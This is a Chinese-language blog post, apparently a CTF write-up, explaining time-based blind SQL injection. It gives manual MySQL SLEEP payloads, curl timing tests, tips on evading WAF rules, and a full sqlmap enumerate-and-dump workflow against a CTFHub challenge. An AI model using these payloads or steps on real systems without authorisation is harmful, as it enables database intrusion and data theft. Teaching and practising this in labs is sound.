@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>深入理解 Time-based Blind SQL 注入：原理、利用与 sqlmap 实操 | 东阳的安全笔记</title>
+<meta name="keywords" content="CTF, Web安全, SQL注入, sqlmap, Time-based Blind">
+<meta name="description" content="一、什么是 Blind SQL 注入
+当应用程序存在 SQL 注入漏洞，但不会在前端直接回显查询结果或错误信息时，传统的 UNION 注入和报错注入便无法直接使用。此时攻击者只能依赖 Blind SQL Injection（盲注） —— 通过观察应用程序的间接反应来逐位推断数据库中的数据。
+盲注分为两大类：
+
+	
+			
+					类型
+					判断依据
+					速度
+			
+	
+	
+			
+					Boolean-based Blind（布尔盲注）
+					页面返回内容/长度是否有差异
+					较快
+			
+			
+					Time-based Blind（时间盲注）
+					响应时间是否有延迟
+					很慢
+			
+	
+
+当页面无论查询成功还是失败都返回完全相同的响应时，布尔盲注失效，时间盲注成为唯一选择。
+
+二、Time-based Blind 注入原理
+2.1 核心思想
+时间盲注不依赖页面内容的变化，而是利用数据库的时间延迟函数（如 MySQL 的 SLEEP()、PostgreSQL 的 pg_sleep()、SQL Server 的 WAITFOR DELAY）来构造条件：
+
+条件为真 → 执行 SLEEP(n) → 响应延迟 n 秒
+条件为假 → 不执行延迟 → 响应正常
+
+通过测量响应时间，攻击者就能判断条件的真假，从而逐位提取数据。
+2.2 手工 Payload 示例
+以 MySQL 为例，假设注入点为 ?id=1，目标是获取 flag 表中的 flag 字段：
+-- 判断数据库名第一个字符是否为 &#39;s&#39;
+?id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=115, SLEEP(5), 0)
+
+-- 判断 flag 表第一条记录的第一个字符是否为 &#39;c&#39;
+?id=1 AND IF(ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 0,1),1,1))=99, SLEEP(5), 0)
+执行逻辑：">
+<meta name="author" content="东阳">
+<link rel="canonical" href="http://localhost:1313/san-blog/posts/ctfhub-time-based-sql-injection/">
+<link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/ctfhub-time-based-sql-injection/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/san-blog/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/san-blog/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/san-blog/posts/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      深入理解 Time-based Blind SQL 注入：原理、利用与 sqlmap 实操
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-03 21:30:00 +0800 CST'>June 3, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>600 words</span>&nbsp;·&nbsp;<span>东阳</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><h2 id="一什么是-blind-sql-注入">一、什么是 Blind SQL 注入<a hidden class="anchor" aria-hidden="true" href="#一什么是-blind-sql-注入">#</a></h2>
+<p>当应用程序存在 SQL 注入漏洞，但<strong>不会在前端直接回显查询结果或错误信息</strong>时，传统的 UNION 注入和报错注入便无法直接使用。此时攻击者只能依赖 <strong>Blind SQL Injection（盲注）</strong> —— 通过观察应用程序的<strong>间接反应</strong>来逐位推断数据库中的数据。</p>
+<p>盲注分为两大类：</p>
+<table>
+	<thead>
+			<tr>
+					<th>类型</th>
+					<th>判断依据</th>
+					<th>速度</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Boolean-based Blind（布尔盲注）</strong></td>
+					<td>页面返回内容/长度是否有差异</td>
+					<td>较快</td>
+			</tr>
+			<tr>
+					<td><strong>Time-based Blind（时间盲注）</strong></td>
+					<td>响应时间是否有延迟</td>
+					<td>很慢</td>
+			</tr>
+	</tbody>
+</table>
+<p>当页面无论查询成功还是失败都返回<strong>完全相同的响应</strong>时，布尔盲注失效，时间盲注成为唯一选择。</p>
+<hr>
+<h2 id="二time-based-blind-注入原理">二、Time-based Blind 注入原理<a hidden class="anchor" aria-hidden="true" href="#二time-based-blind-注入原理">#</a></h2>
+<h3 id="21-核心思想">2.1 核心思想<a hidden class="anchor" aria-hidden="true" href="#21-核心思想">#</a></h3>
+<p>时间盲注不依赖页面内容的变化，而是利用数据库的<strong>时间延迟函数</strong>（如 MySQL 的 <code>SLEEP()</code>、PostgreSQL 的 <code>pg_sleep()</code>、SQL Server 的 <code>WAITFOR DELAY</code>）来构造条件：</p>
+<ul>
+<li>条件为<strong>真</strong> → 执行 <code>SLEEP(n)</code> → 响应延迟 n 秒</li>
+<li>条件为<strong>假</strong> → 不执行延迟 → 响应正常</li>
+</ul>
+<p>通过测量响应时间，攻击者就能判断条件的真假，从而逐位提取数据。</p>
+<h3 id="22-手工-payload-示例">2.2 手工 Payload 示例<a hidden class="anchor" aria-hidden="true" href="#22-手工-payload-示例">#</a></h3>
+<p>以 MySQL 为例，假设注入点为 <code>?id=1</code>，目标是获取 <code>flag</code> 表中的 <code>flag</code> 字段：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 判断数据库名第一个字符是否为 &#39;s&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(ASCII(<span style="color:#66d9ef">SUBSTRING</span>(<span style="color:#66d9ef">DATABASE</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">=</span><span style="color:#ae81ff">115</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 判断 flag 表第一条记录的第一个字符是否为 &#39;c&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(ASCII(<span style="color:#66d9ef">SUBSTRING</span>((<span style="color:#66d9ef">SELECT</span> flag <span style="color:#66d9ef">FROM</span> flag <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">=</span><span style="color:#ae81ff">99</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p><strong>执行逻辑</strong>：</p>
+<ol>
+<li>服务端收到请求，拼接 SQL 执行</li>
+<li>如果 <code>SUBSTRING(...)</code> 的结果确实是 <code>99</code>（即 <code>'c'</code>），则执行 <code>SLEEP(5)</code></li>
+<li>客户端观察到响应耗时约 5 秒 → 推断该位为 <code>'c'</code></li>
+<li>如果响应立即返回 → 该位不是 <code>'c'</code>，继续尝试其他字符</li>
+</ol>
+<h3 id="23-为什么是逐位猜解">2.3 为什么是「逐位猜解」<a hidden class="anchor" aria-hidden="true" href="#23-为什么是逐位猜解">#</a></h3>
+<p>时间盲注无法一次性获取完整字符串，必须：</p>
+<ol>
+<li><strong>逐字符</strong>：先猜第 1 个字符，再猜第 2 个&hellip;</li>
+<li><strong>逐位尝试</strong>：每个字符从 ASCII 32 到 126 逐个试，或用二分查找优化</li>
+<li><strong>逐行遍历</strong>：如果有多条记录，还要 <code>LIMIT n,1</code> 遍历</li>
+</ol>
+<p>假设 flag 长度为 30 个字符，每个字符平均尝试 40 次（二分查找），每次请求延迟 3 秒：</p>
+<pre tabindex="0"><code>30 字符 × 40 次 × 3 秒 = 3600 秒 ≈ 1 小时
+</code></pre><p>这就是时间盲注「慢」的本质——<strong>信息是通过「时间」这个单比特信道传输的</strong>。</p>
+<hr>
+<h2 id="三与布尔盲注的对比">三、与布尔盲注的对比<a hidden class="anchor" aria-hidden="true" href="#三与布尔盲注的对比">#</a></h2>
+<table>
+	<thead>
+			<tr>
+					<th>维度</th>
+					<th>Boolean-based Blind</th>
+					<th>Time-based Blind</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>判断信号</strong></td>
+					<td>页面内容差异（长度/关键字）</td>
+					<td>响应时间差异</td>
+			</tr>
+			<tr>
+					<td><strong>Payload 示例</strong></td>
+					<td><code>AND 1=1</code> vs <code>AND 1=2</code></td>
+					<td><code>AND IF(1=1, SLEEP(5), 0)</code></td>
+			</tr>
+			<tr>
+					<td><strong>单次请求耗时</strong></td>
+					<td>正常网络延迟（毫秒级）</td>
+					<td>SLEEP(n) 延迟（秒级）</td>
+			</tr>
+			<tr>
+					<td><strong>网络稳定性要求</strong></td>
+					<td>低</td>
+					<td>高（波动会影响判断）</td>
+			</tr>
+			<tr>
+					<td><strong>适用场景</strong></td>
+					<td>页面存在真假差异</td>
+					<td>页面完全无差异</td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>关键认知</strong>：时间盲注是布尔盲注的「降级替代方案」。当布尔盲注不可行时才启用时间盲注。如果题目同时支持两种注入，应优先使用布尔盲注。</p>
+<hr>
+<h2 id="四常见应用场景">四、常见应用场景<a hidden class="anchor" aria-hidden="true" href="#四常见应用场景">#</a></h2>
+<p>时间盲注通常出现在以下场景中：</p>
+<h3 id="41-页面完全无回显差异">4.1 页面完全无回显差异<a hidden class="anchor" aria-hidden="true" href="#41-页面完全无回显差异">#</a></h3>
+<p>最典型的场景是：无论 SQL 语句执行成功、失败、报错，服务端返回的页面都<strong>完全一致</strong>（同样的 HTTP 状态码、同样的 HTML 内容、同样的响应长度）。</p>
+<p>这种情况下布尔盲注失去判断依据，只能通过「时间」这个维度来区分真假。</p>
+<h3 id="42-统一错误页面消除了布尔差异">4.2 统一错误页面消除了布尔差异<a hidden class="anchor" aria-hidden="true" href="#42-统一错误页面消除了布尔差异">#</a></h3>
+<p>许多现代 Web 框架配置了全局错误处理：</p>
+<ul>
+<li>SQL 语法错误 → 返回 500 统一错误页</li>
+<li>查询无结果 → 返回 200 空内容页</li>
+<li>正常查询 → 返回 200 正常页</li>
+</ul>
+<p>如果框架把「语法错误」和「查询无结果」都包装成相同的响应，布尔盲注就无法区分 <code>AND 1=1</code> 和 <code>AND 1=2</code> 的差异。</p>
+<h3 id="43-waf-拦截了其他注入类型">4.3 WAF 拦截了其他注入类型<a hidden class="anchor" aria-hidden="true" href="#43-waf-拦截了其他注入类型">#</a></h3>
+<p>WAF 规则通常对以下特征检测较严：</p>
+<ul>
+<li><code>UNION SELECT</code>（UNION 注入）</li>
+<li><code>UPDATEXML</code>、<code>EXTRACTVALUE</code>（报错注入）</li>
+<li>明显的 SQL 报错回显</li>
+</ul>
+<p>但 <code>SLEEP()</code> 和 <code>BENCHMARK()</code> 等时间函数相对隐蔽，可能绕过 WAF 的检测规则，成为唯一可行的注入向量。</p>
+<h3 id="44-数据库权限受限场景">4.4 数据库权限受限场景<a hidden class="anchor" aria-hidden="true" href="#44-数据库权限受限场景">#</a></h3>
+<p>在权限较低的数据库用户场景下：</p>
+<ul>
+<li>无法使用 <code>INTO OUTFILE</code> 写 shell</li>
+<li>无法执行堆叠查询（stacked queries）</li>
+<li>无法调用 <code>xp_cmdshell</code> 等系统命令</li>
+</ul>
+<p>此时即使只有时间盲注这一个通道，攻击者仍然可以通过逐位猜解的方式，慢慢提取数据库中的敏感信息。</p>
+<h3 id="45-存储过程与盲读场景">4.5 存储过程与盲读场景<a hidden class="anchor" aria-hidden="true" href="#45-存储过程与盲读场景">#</a></h3>
+<p>某些业务通过存储过程执行查询，存储过程内部捕获了所有异常并返回统一的「执行成功」状态。外部调用者无法感知 SQL 执行过程中的任何差异，只能依赖时间维度来判断注入是否生效。</p>
+<hr>
+<h2 id="五手工验证确认注入点类型">五、手工验证：确认注入点类型<a hidden class="anchor" aria-hidden="true" href="#五手工验证确认注入点类型">#</a></h2>
+<p>在丢给 sqlmap 之前，建议先用 <code>curl</code> 手工验证目标到底支持哪种注入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. 正常请求（基准）</span>
+</span></span><span style="display:flex;"><span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{time_total}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;http://target.com/?id=1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出: 0.2s</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. 时间盲注测试：条件为真，预期延迟 5 秒</span>
+</span></span><span style="display:flex;"><span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{time_total}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;http://target.com/?id=1 AND IF(1=1, SLEEP(5), 0)&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出: 5.2s ← 有明显延迟，确认存在时间盲注</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 时间盲注测试：条件为假，预期不延迟</span>
+</span></span><span style="display:flex;"><span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{time_total}&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;http://target.com/?id=1 AND IF(1=2, SLEEP(5), 0)&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出: 0.2s ← 无延迟，条件判断生效</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 4. 布尔盲注测试：检查页面长度是否有差异</span>
+</span></span><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;http://target.com/?id=1 AND 1=1&#34;</span> | wc -c
+</span></span><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;http://target.com/?id=1 AND 1=2&#34;</span> | wc -c
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 如果两者长度完全相同 → 布尔盲注不可行</span>
+</span></span></code></pre></div><p>如果步骤 2/3 出现明显延迟差异，而步骤 4 的页面长度完全一致，则可以确认目标只有 <strong>Time-based Blind</strong> 注入。</p>
+<hr>
+<h2 id="五sqlmap-自动化利用实操">五、sqlmap 自动化利用（实操）<a hidden class="anchor" aria-hidden="true" href="#五sqlmap-自动化利用实操">#</a></h2>
+<h3 id="51-题目环境">5.1 题目环境<a hidden class="anchor" aria-hidden="true" href="#51-题目环境">#</a></h3>
+<ul>
+<li><strong>平台</strong>：CTFHub</li>
+<li><strong>目标</strong>：<code>http://challenge-6e6c191bf8163cef.sandbox.ctfhub.com:10800/?id=1</code></li>
+<li><strong>后端</strong>：MySQL &gt;= 5.0.12 (MariaDB fork)</li>
+<li><strong>实际注入类型</strong>：Time-based Blind（<code>SLEEP(5)</code>）</li>
+</ul>
+<h3 id="52-基础检测">5.2 基础检测<a hidden class="anchor" aria-hidden="true" href="#52-基础检测">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --technique<span style="color:#f92672">=</span>T
+</span></span></code></pre></div><p>输出：</p>
+<pre tabindex="0"><code>Type: time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+Payload: id=2766 AND (SELECT 4051 FROM (SELECT(SLEEP(5)))PyfQ)
+</code></pre><h3 id="53-关键参数详解">5.3 关键参数详解<a hidden class="anchor" aria-hidden="true" href="#53-关键参数详解">#</a></h3>
+<table>
+	<thead>
+			<tr>
+					<th>参数</th>
+					<th>作用</th>
+					<th>建议值</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>--batch</code></td>
+					<td>自动回答所有交互提问，避免中途停下来等输入</td>
+					<td>必须加</td>
+			</tr>
+			<tr>
+					<td><code>--technique=T</code></td>
+					<td>强制只使用 Time-based blind 技术</td>
+					<td>已知注入类型时加</td>
+			</tr>
+			<tr>
+					<td><code>--time-sec=3</code></td>
+					<td>设置延迟时间（默认 5 秒）</td>
+					<td>3-5 秒，网络差则加大</td>
+			</tr>
+			<tr>
+					<td><code>--threads=10</code></td>
+					<td>并发线程数</td>
+					<td>10，time-based 下提升有限</td>
+			</tr>
+			<tr>
+					<td><code>--level=3</code></td>
+					<td>检测深度</td>
+					<td>默认 1，提高会测试更多 payload</td>
+			</tr>
+			<tr>
+					<td><code>--risk=1</code></td>
+					<td>风险等级</td>
+					<td>默认 1，CTF 场景通常够用</td>
+			</tr>
+			<tr>
+					<td><code>--flush-session</code></td>
+					<td>清空缓存，重新检测</td>
+					<td>换注入类型时加</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="54-完整利用流程">5.4 完整利用流程<a hidden class="anchor" aria-hidden="true" href="#54-完整利用流程">#</a></h3>
+<p><strong>Step 1：枚举数据库</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --technique<span style="color:#f92672">=</span>T --time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> --dbs
+</span></span></code></pre></div><p><strong>Step 2：枚举表名</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --technique<span style="color:#f92672">=</span>T --time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -D sqli --tables
+</span></span></code></pre></div><p><strong>Step 3：枚举列名</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --technique<span style="color:#f92672">=</span>T --time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -D sqli -T flag --columns
+</span></span></code></pre></div><p><strong>Step 4：Dump 数据</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --technique<span style="color:#f92672">=</span>T --time-sec<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -D sqli -T flag -C flag --dump
+</span></span></code></pre></div><h3 id="55-sqlmap-的输出特征">5.5 sqlmap 的输出特征<a hidden class="anchor" aria-hidden="true" href="#55-sqlmap-的输出特征">#</a></h3>
+<p>运行过程中会看到：</p>
+<pre tabindex="0"><code>[WARNING] time-based comparison requires larger statistical model, please wait
+.............................. (done)
+</code></pre><p>这是 sqlmap 在发大量请求收集<strong>响应时间的统计基线</strong>，用于判断「这次请求是否属于延迟」。不是卡住了，是正常流程。</p>
+<p>数据提取时会「一个字母一个字母地蹦」：</p>
+<pre tabindex="0"><code>ctfhub{2c...
+</code></pre><p>因为 sqlmap 正在逐字符猜解，每猜对一个字符就输出一次。</p>
+<hr>
+<h2 id="六踩坑实录附">六、踩坑实录（附）<a hidden class="anchor" aria-hidden="true" href="#六踩坑实录附">#</a></h2>
+<p>这次实操过程中遇到的几个典型问题：</p>
+<h3 id="坑-1没加---batchsqlmap-停下来等输入">坑 1：没加 <code>--batch</code>，sqlmap 停下来等输入<a hidden class="anchor" aria-hidden="true" href="#坑-1没加---batchsqlmap-停下来等输入">#</a></h3>
+<p>Time-based 模式下 sqlmap 会问：</p>
+<pre tabindex="0"><code>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y/n]
+</code></pre><p>不加 <code>--batch</code> 就会停在这里，看起来像「卡住」。</p>
+<h3 id="坑-2题目分类误导">坑 2：题目分类误导<a hidden class="anchor" aria-hidden="true" href="#坑-2题目分类误导">#</a></h3>
+<p>CTFHub 把这个题放在「布尔注入」分类下，但实际环境只有 time-based blind。用 <code>--technique=B</code> 强制检测布尔盲注会一无所获。</p>
+<p><strong>教训</strong>：工具检测出的实际注入类型比平台分类名更可靠。</p>
+<h3 id="坑-3错误设置---time-sec">坑 3：错误设置 <code>--time-sec</code><a hidden class="anchor" aria-hidden="true" href="#坑-3错误设置---time-sec">#</a></h3>
+<p>不要在 Y/n 提示里输入数字，也不建议把 <code>--time-sec</code> 设得太小（如 0.1 秒）。正常的网络波动都可能超过这个值，导致 sqlmap 完全无法判断真假。</p>
+<h3 id="坑-4session-缓存干扰">坑 4：session 缓存干扰<a hidden class="anchor" aria-hidden="true" href="#坑-4session-缓存干扰">#</a></h3>
+<p>sqlmap 会把检测到的注入点保存在 session 中。如果之前测出了 time-based，之后即使想测布尔盲注，sqlmap 也可能直接恢复 session 中的结果。</p>
+<p><strong>解决</strong>：加 <code>--flush-session</code> 清空缓存重新检测。</p>
+<hr>
+<h2 id="七总结">七、总结<a hidden class="anchor" aria-hidden="true" href="#七总结">#</a></h2>
+<p>Time-based Blind SQL 注入是一种<strong>信息论意义上的「降维攻击」</strong>——将数据库中的多比特信息，压缩成「延迟/不延迟」这一个二进制信号传输出来。正是这种极端的信息压缩，导致了它的慢。</p>
+<p>理解这一点后，sqlmap 的那些「卡顿」「一个字母一个字母地蹦」就不再神秘了。它不是 bug，是时间盲注入的工作方式决定的。</p>
+<p>对于 CTF 选手来说，掌握手工验证方法和 sqlmap 的核心参数，能够在面对盲注场景时快速定位注入类型并选择合适的利用策略。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/sqlmap/">Sqlmap</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/time-based-blind/">Time-Based Blind</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/san-blog/posts/http-header-sql-injection/">
+    <span class="title">« Prev</span>
+    <span>HTTP Header SQL 注入全景：Cookie、User-Agent 与 Referer 的攻击面与防御</span>
+  </a>
+  <a class="next" href="http://localhost:1313/san-blog/posts/sqlmap-usage-guide/">
+    <span class="title">Next »</span>
+    <span>sqlmap 使用指南：从入门到 CTF 夺旗</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+
+    
+    
+    <span>
+        Powered by
